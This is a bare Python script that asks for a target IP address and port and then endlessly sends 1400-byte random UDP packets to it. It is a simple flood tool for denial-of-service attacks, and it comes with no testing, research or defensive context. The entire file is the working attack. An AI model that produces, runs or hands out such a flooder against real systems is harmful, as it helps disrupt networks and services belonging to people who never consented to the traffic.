import socket
import time
import os
s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
m=os.urandom(1400)
i = input("ip: ")
p = int(input("port: "))
a=(i, p)
while True:
   s.sendto(m, a)
